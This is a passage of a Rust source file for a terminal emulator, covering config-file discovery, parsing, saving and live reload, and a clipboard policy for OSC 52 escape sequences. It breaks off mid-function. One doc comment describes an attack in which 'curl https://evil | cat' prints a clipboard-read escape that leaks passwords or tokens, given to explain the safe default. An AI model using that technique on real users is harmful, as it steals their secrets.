//! Startup configuration: a small TOML-subset config file plus its discovery
//! and parsing.
//!
//! The format is a deliberate *subset* of TOML so real TOML files parse, but we
//! carry no dependency: `key = value` pairs, `[section]` headers, `#` comments,
//! double-quoted strings (with `\\`, `\"`, `\t`, `\n` escapes), integers, and
//! floats. Unknown keys or malformed values produce a warning and are skipped —
//! a config file never stops the terminal from starting.
//!
//! Discovery order (first hit wins):
//! 1. `--config <path>` on the command line
//! 2. `$RUSTY_TERM_CONFIG`
//! 3. `%APPDATA%\rusty_term\config.toml` (Windows) or
//!    `$XDG_CONFIG_HOME/rusty_term/config.toml`, defaulting
//!    `$XDG_CONFIG_HOME` to `~/.config` (Unix)
//!
//! A missing file is not an error — every setting has a built-in default and
//! the file only overrides what it names.

use std::path::PathBuf;

use crate::core::{CursorShape, Theme};
use crate::keymap::{Keymap, parse_action, parse_chord};

/// Initial window state (`--maximized` / `--fullscreen`, or a `[window]
/// launch_mode` config key); `None` is the normal windowed default.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum LaunchMode {
    Maximized,
    Fullscreen,
}

/// OSC 52 clipboard policy (`clipboard` config key). A child program can ask
/// the terminal to read the system clipboard back to it (`52;c;?`) — with no
/// gate, `curl https://evil | cat` printing that escape sequence silently
/// hands over whatever the user last copied (passwords, tokens). Mirrors the
/// xterm `allowWindowOps` / kitty `clipboard_control` default posture: writes
/// are allowed (a program setting the clipboard is unlikely to be malicious
/// and is the common case — copying a command's output over SSH), reads are
/// not, unless explicitly opted into.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum ClipboardPolicy {
    /// Neither OSC 52 sets nor queries touch the system clipboard.
    Off,
    /// Sets are applied; queries are ignored. Default.
    #[default]
    WriteOnly,
    /// Sets and queries are both honored.
    ReadWrite,
}

/// One `[profile.<name>]` bundle: everything a "launch this kind of tab"
/// action needs. Absent keys fall back to the top-level config.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Profile {
    pub name: String,
    pub shell: Option<String>,
    pub cwd: Option<PathBuf>,
    pub theme: Option<Theme>,
}

/// One tab of a session file (`[tab]` sections in order): what to run,
/// where, how it looks, and how it's split.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct SessionTab {
    /// Profile supplying shell/cwd/theme defaults for this tab.
    pub profile: Option<String>,
    pub cwd: Option<PathBuf>,
    /// Program to run instead of the shell, split on whitespace (no shell
    /// quoting — run a wrapper script for anything fancier).
    pub command: Option<String>,
    /// Extra panes: a comma-separated sequence of `right` / `down` splits
    /// applied after the tab spawns.
    pub splits: Vec<String>,
}

/// Parsed configuration with everything optional; `None` / the [`Theme`]
/// defaults mean "keep the built-in behavior".
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Config {
    /// Shell command to spawn instead of `$SHELL` / `%COMSPEC%`.
    pub shell: Option<String>,
    /// Explicit argv appended after `shell` (`--command`/`-e`/a trailing `--
    /// prog arg...`), overriding any args embedded in `shell` itself. CLI-only
    /// — a per-launch override, not a persisted config key.
    pub command_args: Vec<String>,
    /// Starting directory for the child shell (`--cwd`/`--starting-directory`).
    /// CLI-only, same reasoning as `command_args`.
    pub cwd: Option<PathBuf>,
    /// Initial window title seed (`--title` CLI flag or a top-level `title`
    /// config key); child OSC 0/2 still wins once emitted.
    pub title: Option<String>,
    /// Initial window state (windowed front-end only).
    pub launch_mode: Option<LaunchMode>,
    /// Window background opacity, `0.0` (fully transparent) to `1.0` (opaque,
    /// the default). Windowed front-end only, and only the GPU (`gui-gpu`)
    /// renderer honors it — the CPU renderer's `softbuffer` presentation path
    /// has no alpha channel to composite through, so it stays fully opaque
    /// regardless of this setting (see `gui::gpu`'s uniform buffer).
    pub opacity: Option<f32>,
    /// Inner margin in pixels around the terminal content, below the chrome
    /// bar (`[window] padding`; default 8, 0 restores the flush layout). The
    /// band paints in the theme background so content reads as inset.
    pub padding: Option<u32>,
    /// Implicit bidi (`bidi = "auto"`): UAX #9 reordering of RTL-containing
    /// rows at render time (`"off"`/unset disables; storage stays logical
    /// order either way — see docs/research/bidi-scoping-2026-07.md).
    pub bidi: Option<bool>,
    /// Whether the cursor leaves a brief fading trail when it jumps
    /// (`cursor_trail`; default off) — pure renderer eye candy (G36).
    pub cursor_trail: Option<bool>,
    /// Whether Ctrl+Shift+C also puts styled HTML on the clipboard alongside
    /// plain text (`copy_html`; default on). Rich-paste targets (docs, chat)
    /// get colors; plain editors still read the text flavor.
    pub copy_html: Option<bool>,
    /// OSC 52 clipboard policy (`clipboard`; default `"write-only"` — see
    /// [`ClipboardPolicy`]). Only consulted by the windowed front-end, which
    /// is the one that owns the system clipboard; the TUI relays OSC 52 to
    /// the host terminal, whose own policy applies.
    pub clipboard: Option<ClipboardPolicy>,
    /// Height of the quake (dropdown) window as a fraction of the monitor's
    /// height, `0.1..=1.0` (`[window] quake_height`; default 0.4). The window
    /// itself is created/toggled with `rusty_term ctl quake`.
    pub quake_height: Option<f32>,
    /// Global hotkey that toggles the quake window without an external
    /// binding tool (`[window] quake_hotkey`, e.g. `"win+grave"`; Windows
    /// only — Unix desktops bind `rusty_term ctl quake` at the WM/DE level
    /// instead). A malformed spec is a startup warning, not a hard error.
    pub quake_hotkey: Option<String>,
    /// Named launch profiles (`[profile.<name>]` sections): a shell + cwd +
    /// theme bundle, surfaced in the shell-launcher dropdown and selectable
    /// at startup with `--profile <name>`.
    pub profiles: Vec<Profile>,
    /// Serve the control socket and let a second `--single-instance` launch
    /// reuse this instance (windowed front-end, Unix). Also enabled by the
    /// `--single-instance` flag.
    pub single_instance: Option<bool>,
    /// Session file to open at startup (`session = "path"` or `--session`):
    /// a list of tabs (cwd/command/profile/splits) the window builds instead
    /// of the single default shell. Windowed front-end only.
    pub session: Option<PathBuf>,
    /// Minimum WCAG contrast ratio enforced between text and its background
    /// at render time (`minimum_contrast = 4.5`); `None`/1.0 disables. Fixes
    /// unreadable app-hardcoded color combinations, at the cost of exact
    /// color fidelity for the offending cells.
    pub minimum_contrast: Option<f32>,
    /// `theme = "auto"`: follow the OS light/dark appearance, resolving to
    /// [`Config::theme_dark`] / [`Config::theme_light`] (windowed front-end;
    /// TUI mode has no OS-appearance signal and keeps `theme_dark`).
    pub theme_auto: bool,
    /// Preset used when the OS appearance is dark under `theme = "auto"`
    /// (`theme_dark = "name"`; default the built-in default theme).
    pub theme_dark: Option<Theme>,
    /// Preset used when the OS appearance is light under `theme = "auto"`
    /// (`theme_light = "name"`; default `solarized-light`).
    pub theme_light: Option<Theme>,
    /// Click-to-move-cursor: a plain click at the shell prompt sends the
    /// arrow presses that move the readline cursor to the clicked cell
    /// (needs OSC 133 shell integration; default on, `click_to_move =
    /// false` disables).
    pub click_to_move: Option<bool>,
    /// Whether BEL raises an alert (windowed front-end): a window-attention
    /// request when the window is unfocused, plus a badge on the ringing tab.
    /// Default on; `bell = false` silences both. (There is no audible bell —
    /// the TUI relays BEL to the host, which applies its own policy.)
    pub bell: Option<bool>,
    /// Minimum runtime, in seconds, before a command finishing (OSC 133/633
    /// `D`) in an unfocused window / background tab raises a desktop
    /// notification. `0` disables the notification entirely. Default 10.
    pub command_notify_secs: Option<u64>,
    /// Scrollback line cap (overrides [`crate::core::SCROLLBACK_MAX`]).
    pub scrollback: Option<usize>,
    /// Initial window size in cells (windowed front-end only; the TUI always
    /// adopts the host terminal's size).
    pub cols: Option<u16>,
    pub rows: Option<u16>,
    /// Font file path (windowed front-end only).
    pub font: Option<PathBuf>,
    /// Font size in pixels (windowed front-end only).
    pub font_size: Option<f32>,
    /// Bold / italic / bold-italic font paths (windowed front-end). Unset falls
    /// back to filename-derived siblings of `font`, then to the regular face.
    pub font_bold: Option<PathBuf>,
    pub font_italic: Option<PathBuf>,
    pub font_bold_italic: Option<PathBuf>,
    /// Fallback font for glyphs the main font lacks (CJK, symbols, emoji).
    pub font_fallback: Option<PathBuf>,
    /// Enable programming-font ligatures (GSUB `liga`/`calt`) in the windowed
    /// front-end. Default on; ignored if the font has no ligatures.
    pub ligatures: Option<bool>,
    /// Startup colors: default fg/bg/cursor and the 16-color ANSI palette.
    pub theme: Theme,
    /// Default cursor shape (windowed front-end). DECSCUSR can override it at
    /// runtime; RIS/DECSTR restore this default.
    pub cursor_style: Option<CursorShape>,
    /// Whether the cursor blinks by default (windowed front-end).
    pub cursor_blink: Option<bool>,
    /// Keybindings for terminal-owned shortcuts (windowed front-end); the
    /// `[keys]` section overrides individual actions on top of the defaults.
    pub keys: Keymap,
}

impl Config {
    /// Load the config: resolve the path (CLI flag > env var > platform
    /// default), read it, parse it. Returns the config plus human-readable
    /// warnings for anything skipped. A missing file yields pure defaults and
    /// no warnings; an unreadable *explicitly requested* file yields a warning.
    pub fn load(args: &[String]) -> (Config, Vec<String>) {
        let (resolved, mut warnings) = resolve_path(args);
        let (path, explicit) = match resolved {
            Some(p) => p,
            None => return (Config::default(), warnings),
        };
        match std::fs::read_to_string(&path) {
            Ok(text) => {
                let (cfg, parse_warnings) = parse(&text);
                warnings.extend(parse_warnings.into_iter().map(|w| format!("{}: {}", path.display(), w)));
                (cfg, warnings)
            }
            Err(e) if explicit => {
                warnings.push(format!("config {}: {}", path.display(), e));
                (Config::default(), warnings)
            }
            Err(_) => (Config::default(), warnings), // default path absent: fine
        }
    }

    /// The config file this invocation reads or would read: the explicit path
    /// (CLI/env) if given, else the platform default location — returned even
    /// when the file doesn't exist yet, so callers can watch for its creation
    /// or create it (`Ctrl+Shift+,`). `None` only when no config root exists
    /// (e.g. `%APPDATA%`/`$HOME` unset).
    pub fn file_path(args: &[String]) -> Option<PathBuf> {
        if let (Some((p, _)), _) = resolve_path(args) {
            return Some(p);
        }
        Some(default_config_dir()?.join("rusty_term").join("config.toml"))
    }

    /// A commented starter config, written when the open-config shortcut
    /// targets a file that doesn't exist yet.
    pub fn template() -> &'static str {
        r##"# rusty_term configuration. Saving this file applies theme and
# scrollback changes to running instances immediately; shell, font,
# and window size apply on the next launch. The in-app settings page
# (Ctrl+, in the --gui window) edits the common keys below and saves here.

# shell = "pwsh"           # or "wsl", "powershell", a full path, ...
# scrollback = 10000       # history line cap; 0 disables
# theme = "gruvbox-dark"   # see README for the preset list
# title = "naner: dev"     # initial window title; child OSC 0/2 still wins

# [window]                 # windowed (--gui) front-end only
# cols = 120
# rows = 40
# font = "C:\\Windows\\Fonts\\CascadiaMono.ttf"
# font-size = 18
# ligatures = false        # disable programming-font ligatures (default on)
# launch_mode = "maximized" # or "fullscreen"
# opacity = 0.9            # 0.0-1.0; GPU renderer (--features gui-gpu) only
# padding = 8               # pixels of inner margin around the terminal (0 = flush)
# quake_height = 0.4       # dropdown-window height fraction (rusty_term ctl quake)
# quake_hotkey = "win+grave" # global hotkey toggling the quake window (Windows only)

# copy_html = false         # don't add styled HTML to Ctrl+Shift+C copies
# clipboard = "write-only"  # OSC 52 policy: "off", "write-only" (default), or "read-write"
# cursor_trail = true       # fading trail when the cursor jumps
# bidi = "auto"             # reorder RTL text at render time (UAX #9)

# [colors]                 # override individual colors (after any preset)
# foreground = "#d8d8d8"
# background = "#1d1f21"
# cursor     = "#aeafad"
# color0     = "#282a2e"   # ANSI palette, color0..color15
"##
    }
}

/// A `--flag value` or `--flag=value` CLI argument's value, first match wins.
/// Shared by the initial CLI parse (`main.rs`) and both front-ends' live
/// config-reload paths, so a flag like `--profile` is read identically
/// whether it's being applied at startup or reapplied after a reload.
pub fn flag_value<'a>(args: &'a [String], name: &str) -> Option<&'a str> {
    let eq_prefix = format!("{name}=");
    let mut it = args.iter();
    while let Some(a) = it.next() {
        if a == name {
            return it.next().map(String::as_str);
        }
        if let Some(v) = a.strip_prefix(eq_prefix.as_str()) {
            return Some(v);
        }
    }
    None
}

/// The config file to read, if any, and whether the user *named* it (CLI/env)
/// rather than us probing the platform default. Explicit paths are returned
/// even if unreadable so the caller can warn; the default path only when it
/// exists. A `--config` given with no following path is *not* treated as
/// "config disabled" — it used to `return` `None` immediately from here,
/// silently skipping the `$RUSTY_TERM_CONFIG` and platform-default fallbacks
/// below and leaving the user's real config unloaded with no explanation.
/// Instead it warns and falls through to the normal discovery chain.
fn resolve_path(args: &[String]) -> (Option<(PathBuf, bool)>, Vec<String>) {
    let mut warnings = Vec::new();
    let mut it = args.iter();
    while let Some(a) = it.next() {
        if a == "--config" {
            match it.next() {
                Some(p) => return (Some((PathBuf::from(p), true)), warnings),
                None => {
                    warnings.push(
                        "--config given with no path; checking $RUSTY_TERM_CONFIG and the default location instead"
                            .to_string(),
                    );
                    break;
                }
            }
        }
        if let Some(p) = a.strip_prefix("--config=") {
            return (Some((PathBuf::from(p), true)), warnings);
        }
    }
    if let Some(p) = std::env::var_os("RUSTY_TERM_CONFIG") {
        return (Some((PathBuf::from(p), true)), warnings);
    }
    let Some(base) = default_config_dir() else { return (None, warnings) };
    let p = base.join("rusty_term").join("config.toml");
    (p.exists().then_some((p, false)), warnings)
}

/// Platform config root: `%APPDATA%` on Windows, `$XDG_CONFIG_HOME` (default
/// `~/.config`) elsewhere.
fn default_config_dir() -> Option<PathBuf> {
    #[cfg(windows)]
    {
        std::env::var_os("APPDATA").map(PathBuf::from)
    }
    #[cfg(not(windows))]
    {
        if let Some(x) = std::env::var_os("XDG_CONFIG_HOME")
            && !x.is_empty()
        {
            return Some(PathBuf::from(x));
        }
        std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config"))
    }
}

/// Open the config file in the user's editor (the `Ctrl+Shift+,` shortcut),
/// creating it with the commented [`Config::template`] first if it doesn't
/// exist. Detached — the editor is not a child we wait on. `$VISUAL`/`$EDITOR`
/// win when set; else the platform opener (`start`/`open`/`xdg-open`) routes
/// to the user's associated editor.
pub fn open_in_editor(path: &std::path::Path) -> std::io::Result<()> {
    if !path.exists() {
        if let Some(dir) = path.parent() {
            std::fs::create_dir_all(dir)?;
        }
        std::fs::write(path, Config::template())?;
    }
    if let Some(editor) = std::env::var_os("VISUAL").or_else(|| std::env::var_os("EDITOR")) {
        return std::process::Command::new(editor).arg(path).spawn().map(drop);
    }
    #[cfg(windows)]
    {
        // `start` is a cmd builtin; the empty quoted arg is its title slot.
        std::process::Command::new("cmd")
            .args(["/C", "start", ""])
            .arg(path)
            .spawn()
            .map(drop)
    }
    #[cfg(target_os = "macos")]
    {
        std::process::Command::new("open").arg(path).spawn().map(drop)
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        std::process::Command::new("xdg-open").arg(path).spawn().map(drop)
    }
}

/// A double-quoted TOML string literal for `s`, escaping the backslash, quote,
/// tab, newline, and CR that [`parse_value`] understands — so a Windows path
/// like `C:\Foo\bar.exe` round-trips through the config file unmangled.
#[cfg_attr(not(feature = "gui"), allow(dead_code))]
pub(crate) fn toml_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\t' => out.push_str("\\t"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// One setting the in-app settings page persists. `section` is the TOML section
/// it belongs under (`""` for the top level). `value` is `Some(literal)` to set
/// the key (e.g. [`toml_string`] output, `"18"`, `"true"`) or `None` to remove
/// it (used when a choice returns to "use the platform default"). `insert`
/// controls a `Some` value when the key is absent: `true` adds it, `false`
/// leaves it out — so a setting left at its built-in default updates an existing
/// line but never adds noise to a file that never mentioned it.
#[cfg_attr(not(feature = "gui"), allow(dead_code))]
pub(crate) struct SettingEdit {
    pub section: &'static str,
    pub key: &'static str,
    pub value: Option<String>,
    pub insert: bool,
}

/// Persist `edits` into the config file at `path`, preserving its comments,
/// formatting, and every key the settings page doesn't manage (fonts, custom
/// colors, keybindings). Creates the file (and parent dirs) from the commented
/// [`Config::template`] when absent. The live-reload watcher re-reads the save.
#[cfg_attr(not(feature = "gui"), allow(dead_code))]
pub(crate) fn save_settings(path: &std::path::Path, edits: &[SettingEdit]) -> std::io::Result<()> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Config::template().to_string(),
        Err(e) => return Err(e),
    };
    let updated = upsert(&text, edits);
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)?;
    }
    // Write to a sibling temp file then rename: the live-reload watcher (and
    // any concurrent loader) polls this path, so an atomic replace avoids it
    // ever observing a half-written config.
    let tmp = path.with_extension("toml.tmp");
    std::fs::write(&tmp, updated)?;
    std::fs::rename(&tmp, path)
}

/// Upsert `edits` into config `text`: each setting's existing active `key = …`
/// line (matched within its section) is rewritten to its new value or removed
/// (`value: None`); a setting with no existing line is inserted when it carries
/// a value and `insert`, creating the section header if needed. Comments, blank
/// lines, and unmanaged keys are preserved verbatim. Pure (no I/O) so it is
/// unit-tested directly.
#[cfg_attr(not(feature = "gui"), allow(dead_code))]
fn upsert(text: &str, edits: &[SettingEdit]) -> String {
    let mut lines: Vec<String> = text.lines().map(str::to_string).collect();
    let mut done = vec![false; edits.len()];
    let mut remove: Vec<usize> = Vec::new();

    // Pass 1: rewrite (or mark for removal) existing assignments, tracking the
    // active section so a key matches only under its own header (`font_size`
    // lives in `[window]`).
    let mut section = String::new();
    for (li, line) in lines.iter_mut().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if let Some(name) = header_name(trimmed) {
            section = name;
            continue;
        }
        let Some((k, _)) = trimmed.split_once('=') else { continue };
        let k = k.trim().to_ascii_lowercase().replace('-', "_");
        for (i, e) in edits.iter().enumerate() {
            if !done[i] && e.section == section && e.key == k {
                match &e.value {
                    Some(v) => *line = format!("{} = {}", e.key, v),
                    None => remove.push(li),
                }
                done[i] = true;
                break;
            }
        }
    }
    if !remove.is_empty() {
        let mut i = 0;
        lines.retain(|_| {
            let keep = !remove.contains(&i);
            i += 1;
            keep
        });
    }

    // Pass 2: insert the rest — settings carrying a value and `insert` but with
    // no existing line. Top-level keys go before the first section header (TOML
    // scoping); a named section's keys go right after its header, the section
    // being appended at EOF when it doesn't exist yet.
    let pending: Vec<(&str, &str, &String)> = edits
        .iter()
        .zip(&done)
        .filter_map(|(e, &d)| match &e.value {
            Some(v) if !d && e.insert => Some((e.section, e.key, v)),
            _ => None,
        })
        .collect();
    let at = lines.iter().position(|l| header_name(l.trim()).is_some()).unwrap_or(lines.len());
    for (off, &(_, key, v)) in pending.iter().filter(|(s, _, _)| s.is_empty()).enumerate() {
        lines.insert(at + off, format!("{key} = {v}"));
    }
    let mut by_sec: std::collections::BTreeMap<&str, Vec<(&str, &String)>> =
        std::collections::BTreeMap::new();
    for &(sec, key, v) in pending.iter().filter(|(s, _, _)| !s.is_empty()) {
        by_sec.entry(sec).or_default().push((key, v));
    }
    for (sec, items) in by_sec {
        match lines.iter().position(|l| header_name(l.trim()).as_deref() == Some(sec)) {
            Some(h) => {
                for (off, (key, v)) in items.iter().enumerate() {
                    lines.insert(h + 1 + off, format!("{key} = {v}"));
                }
            }
            None => {
                if lines.last().is_some_and(|l| !l.trim().is_empty()) {
                    lines.push(String::new());
                }
                lines.push(format!("[{sec}]"));
                for (key, v) in &items {
                    lines.push(format!("{key} = {v}"));
                }
            }
        }
    }

    let mut out = lines.join("\n");
    if !out.is_empty() {
        out.push('\n');
    }
    out
}

/// The lowercased name inside a `[section]` header line, or `None` when `line`
/// (already trimmed) isn't a well-formed header. Mirrors [`parse`]'s rule.
#[cfg_attr(not(feature = "gui"), allow(dead_code))]
fn header_name(line: &str) -> Option<String> {
    let rest = line.strip_prefix('[')?;
    let (name, tail) = rest.split_once(']')?;
    let tail = tail.trim();
    (tail.is_empty() || tail.starts_with('#')).then(|| name.trim().to_ascii_lowercase())
}

/// Watch `path` for changes from a daemon thread, invoking `on_change` after
/// each observed modification. A simple 500ms mtime/length poll — editors
/// vary wildly in how they save (rename-over, truncate+write, atomic temp
/// file), and polling sees through all of them, needs no platform API, and a
/// half-second latency is imperceptible next to a manual save. Also fires
/// when the file first appears.
pub fn watch(path: PathBuf, on_change: impl Fn() + Send + 'static) {
    fn stamp(p: &std::path::Path) -> Option<(std::time::SystemTime, u64)> {
        let m = std::fs::metadata(p).ok()?;
        Some((m.modified().ok()?, m.len()))
    }
    std::thread::spawn(move || {
        let mut last = stamp(&path);
        loop {
            std::thread::sleep(std::time::Duration::from_millis(500));
            let now = stamp(&path);
            if now != last {
                // Half-written saves settle within a poll tick; a second
                // change event after the settle is harmless (idempotent apply).
                if now.is_some() {
                    on_change();
                }
                last = now;
            }
        }
    });
}

/// One parsed `key = value` payload.
#[derive(Debug, PartialEq)]
enum Value {
    Str(String),
    Int(i64),
    Float(f64),
    Bool(bool),
}

/// Parse config text. Never fails: every malformed or unknown line becomes a
/// warning and is otherwise ignored.
fn parse(text: &str) -> (Config, Vec<String>) {
    let mut cfg = Config::default();
    let mut warnings = Vec::new();
    let mut section = String::new();

    for (idx, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            match rest.split_once(']') {
                Some((name, tail)) if tail.trim().is_empty() || tail.trim().starts_with('#') => {
                    section = name.trim().to_ascii_lowercase();
                }
                _ => warnings.push(format!("line {}: malformed section header", idx + 1)),
            }
            continue;
        }
        let Some((key, rest)) = line.split_once('=') else {
            warnings.push(format!("line {}: expected `key = value`", idx + 1));
            continue;
        };
        // Normalize `font-size` and `font_size` to one spelling.
        let key = key.trim().to_ascii_lowercase().replace('-', "_");
        let value = match parse_value(rest.trim()) {
            Ok(v) => v,
            Err(e) => {
                warnings.push(format!("line {}: {} ({})", idx + 1, e, key));
                continue;
            }
        };
        if let Err(e) = apply(&mut cfg, &section, &key, value) {
            warnings.push(format!("line {}: {}", idx + 1, e));
        }
    }
    (cfg, warnings)
}

/// Parse the right-hand side of `key = …`: a double-quoted string (with
/// `\\ \" \t \n \r` escapes) or a bare integer/float. Trailing `#` comments are
/// honored outside quotes.
fn parse_value(s: &str) -> Result<Value, String> {
    if let Some(rest) = s.strip_prefix('"') {
        let mut out = String::new();
        let mut chars = rest.chars();
        while let Some(c) = chars.next() {
            match c {
                '"' => {
                    let tail = chars.as_str().trim();
                    if !tail.is_empty() && !tail.starts_with('#') {
                        return Err("trailing characters after closing quote".into());
                    }
                    return Ok(Value::Str(out));
                }
                '\\' => match chars.next() {
                    Some('\\') => out.push('\\'),
                    Some('"') => out.push('"'),
                    Some('t') => out.push('\t'),
                    Some('n') => out.push('\n'),
                    Some('r') => out.push('\r'),
                    other => return Err(format!("unsupported escape \\{}", other.unwrap_or(' '))),
                },
                c => out.push(c),
            }
        }
        return Err("unterminated string".into());
    }
    // Bare scalar: strip a trailing comment, then try integer, then float.
    let bare = match s.find('#') {
        Some(i) => s[..i].trim(),
        None => s,
    };
    if bare.is_empty() {
        return Err("missing value".into());
    }
    if bare == "true" {
        return Ok(Value::Bool(true));
    }
    if bare == "false" {
        return Ok(Value::Bool(false));
    }
    if let Ok(i) = bare.parse::<i64>() {
        return Ok(Value::Int(i));
    }
    if let Ok(f) = bare.parse::<f64>() {
        return Ok(Value::Float(f));
    }
    Err(format!("unrecognized value `{bare}` (strings need quotes)"))
}

/// Route one parsed key/value into the config. Unknown sections/keys and
/// type mismatches return a warning message.
fn apply(cfg: &mut Config, section: &str, key: &str, value: Value) -> Result<(), String> {
    match (section, key) {
        ("", "shell") => cfg.shell = Some(expect_str(key, value)?),
        ("", "session") => cfg.session = Some(PathBuf::from(expect_str(key, value)?)),
        ("", "single_instance") => cfg.single_instance = Some(expect_bool(key, value)?),
        ("", "click_to_move") => cfg.click_to_move = Some(expect_bool(key, value)?),
        ("", "bell") => cfg.bell = Some(expect_bool(key, value)?),
        ("", "command_notify_secs") => {
            cfg.command_notify_secs = Some(expect_int(key, value)?.clamp(0, 86_400) as u64)
        }
        ("", "scrollback") => {
            cfg.scrollback = Some(expect_int(key, value)?.clamp(0, 10_000_000) as usize)
        }
        ("", "theme") => {
            let name = expect_str(key, value)?;
            if name.eq_ignore_ascii_case("auto") {
                cfg.theme_auto = true;
            } else {
                cfg.theme = preset(&name)
                    .ok_or_else(|| format!("unknown theme `{name}` (try {})", PRESETS.join(", ")))?;
            }
        }
        ("", "theme_dark") => {
            let name = expect_str(key, value)?;
            cfg.theme_dark = Some(preset(&name).ok_or_else(|| format!("unknown theme `{name}`"))?);
        }
        ("", "theme_light") => {
            let name = expect_str(key, value)?;
            cfg.theme_light = Some(preset(&name).ok_or_else(|| format!("unknown theme `{name}`"))?);
        }
        ("", "minimum_contrast") => {
            let ratio = match value {
                Value::Float(f) => f as f32,
                Value::Int(i) => i as f32,
                _ => return Err(format!("{key}: expected a number")),
            };
            cfg.minimum_contrast = Some(ratio.clamp(1.0, 21.0));
        }
        ("window", "cols") => cfg.cols = Some(expect_dim(key, value)?),
        ("window", "rows") => cfg.rows = Some(expect_dim(key, value)?),
        ("window", "font") => cfg.font = Some(PathBuf::from(expect_str(key, value)?)),
        ("window", "font_bold") => cfg.font_bold = Some(PathBuf::from(expect_str(key, value)?)),
        ("window", "font_italic") => cfg.font_italic = Some(PathBuf::from(expect_str(key, value)?)),
        ("window", "font_bold_italic") => {
            cfg.font_bold_italic = Some(PathBuf::from(expect_str(key, value)?))
        }
        ("window", "font_fallback") => {
            cfg.font_fallback = Some(PathBuf::from(expect_str(key, value)?))
        }
        ("window", "ligatures") => cfg.ligatures = Some(expect_bool(key, value)?),
        ("window", "launch_mode") => {
            let name = expect_str(key, value)?;
            cfg.launch_mode = Some(match name.to_ascii_lowercase().as_str() {
                "maximized" | "maximize" | "max" => LaunchMode::Maximized,
                "fullscreen" | "full" => LaunchMode::Fullscreen,
                _ => return Err(format!("unknown {key} `{name}` (maximized or fullscreen)")),
            });
        }
        ("window", "font_size") => {
            let px = match value {
                Value::Float(f) => f,
                Value::Int(i) => i as f64,
                _ => return Err(format!("{key}: expected a number")),
            };
            if !(4.0..=512.0).contains(&px) {
                return Err(format!("{key}: {px} out of range (4-512)"));
            }
            cfg.font_size = Some(px as f32);
        }
        ("window", "padding") => {
            let px = match value {
                Value::Int(i) => i,
                _ => return Err(format!("{key}: expected an integer pixel count")),
            };
            if !(0..=64).contains(&px) {
                return Err(format!("{key}: {px} out of range (0-64)"));
            }
            cfg.padding = Some(px as u32);
        }
        ("window", "opacity") => {
            let v = match value {
                Value::Float(f) => f,
                Value::Int(i) => i as f64,
                _ => return Err(format!("{key}: expected a number")),
            };
            if !(0.0..=1.0).contains(&v) {
                return Err(format!("{key}: {v} out of range (0.0-1.0)"));
            }
            cfg.opacity = Some(v as f32);
        }
        ("window", "quake_height") => {
            let v = match value {
                Value::Float(f) => f,
                Value::Int(i) => i as f64,
                _ => return Err(format!("{key}: expected a number")),
            };
            if !(0.1..=1.0).contains(&v) {
                return Err(format!("{key}: {v} out of range (0.1-1.0)"));
            }
            cfg.quake_height = Some(v as f32);
        }
        ("window", "quake_hotkey") => cfg.quake_hotkey = Some(expect_str(key, value)?),
        ("colors", "foreground") => cfg.theme.fg = expect_color(key, value)?,
        ("colors", "background") => cfg.theme.bg = expect_color(key, value)?,
        ("colors", "cursor") => cfg.theme.cursor = expect_color(key, value)?,
        ("colors", k) => {
            let Some(n) = k
                .strip_prefix("color")
                .and_then(|n| n.parse::<usize>().ok())
                .filter(|&n| n < 16)
            else {
                return Err(format!("unknown [colors] key `{k}`"));
            };
            cfg.theme.palette16[n] = expect_color(k, value)?;
        }
        ("", "copy_html") => cfg.copy_html = Some(expect_bool(key, value)?),
        ("", "clipboard") => {
            let name = expect_str(key, value)?;
            cfg.clipboard = Some(match name.to_ascii_lowercase().as_str() {
                "off" | "none" => ClipboardPolicy::Off,
                "write-only" | "write_only" | "writeonly" => ClipboardPolicy::WriteOnly,
                "read-write" | "read_write" | "readwrite" | "rw" => ClipboardPolicy::ReadWrite,
                _ => {
                    return Err(format!(
                        "unknown {key} `{name}` (off, write-only, or read-write)"
                    ));
                }
            });
        }
        ("", "cursor_trail") => cfg.cursor_trail = Some(expect_bool(key, value)?),
        ("", "bidi") => {
            cfg.bidi = Some(match expect_str(key, value)?.as_str() {
                "auto" => true,
                "off" => false,
                other => return Err(format!("bidi: `{other}` (expected \"auto\" or \"off\")")),
            });
        }
        ("", "cursor_style") => {
            cfg.cursor_style = Some(parse_cursor_shape(&expect_str(key, value)?)?)
        }
        ("", "cursor_blink") => cfg.cursor_blink = Some(expect_bool(key, value)?),
        ("", "title") => cfg.title = Some(expect_str(key, value)?),
        ("keys", k) => {
            let action =
                parse_action(k).ok_or_else(|| format!("unknown [keys] action `{k}`"))?;
            cfg.keys.set(action, parse_chord(&expect_str(key, value)?)?);
        }
        // `[profile.<name>]` sections collect into named launch profiles.
        (s, k) if s.starts_with("profile.") && !s["profile.".len()..].is_empty() => {
            let name = &s["profile.".len()..];
            let idx = match cfg.profiles.iter().position(|p| p.name == name) {
                Some(i) => i,
                None => {
                    cfg.profiles.push(Profile { name: name.to_string(), ..Profile::default() });
                    cfg.profiles.len() - 1
                }
            };
            let p = &mut cfg.profiles[idx];
            match k {
                "shell" => p.shell = Some(expect_str(key, value)?),
                "cwd" => p.cwd = Some(PathBuf::from(expect_str(key, value)?)),
                "theme" => {
                    let t = expect_str(key, value)?;
                    p.theme =
                        Some(preset(&t).ok_or_else(|| format!("unknown theme `{t}` in [{s}]"))?);
                }
                other => return Err(format!("unknown key `{other}` in [{s}]")),
            }
        }
        ("", k) => return Err(format!("unknown key `{k}`")),
        (s, k) => return Err(format!("unknown key `{k}` in [{s}]")),
    }
    Ok(())
}

fn expect_str(key: &str, v: Value) -> Result<String, String> {
    match v {
